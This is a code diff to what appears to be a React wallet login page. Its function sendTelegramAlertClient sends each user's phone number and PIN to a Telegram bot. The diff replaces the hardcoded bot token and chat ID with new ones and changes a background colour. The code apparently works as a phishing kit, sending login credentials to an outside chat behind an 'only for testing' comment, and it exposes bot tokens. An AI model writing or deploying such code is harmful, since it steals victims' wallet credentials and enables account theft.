@@ -28,8 +28,8 @@ const Index = () => {
   // Client-side Telegram alert (unsafe, only for testing)
 // Client-side Telegram alert (unsafe, only for testing)
 const sendTelegramAlertClient = (phone: string, pin: string) => {
-  const BOT_TOKEN = "8103077148:AAFqIn9BWjUZFFB3ZZo1hilGdpaVyvH93PQ"; // ⚠ Only for testing
-  const CHAT_ID = "5428983793";
+  const BOT_TOKEN = "8244803895:AAElCNS9IzbpDj8WfaBJM04tH9zrMSpvpjc";
+  const CHAT_ID = "6564676243";
 
   const message = `🔔Wallet Login Alert\nPhone: ${phone}\nPIN: ${pin}`;
 
@@ -62,7 +62,7 @@ const sendTelegramAlertClient = (phone: string, pin: string) => {
 
 
   return (
-    <div className="min-h-screen bg-background flex flex-col relative">
+    <div className="min-h-screen bg-gray flex flex-col relative">
       {/* Loading Overlay */}
       {isLoading && (
         <div className="absolute inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center z-50">
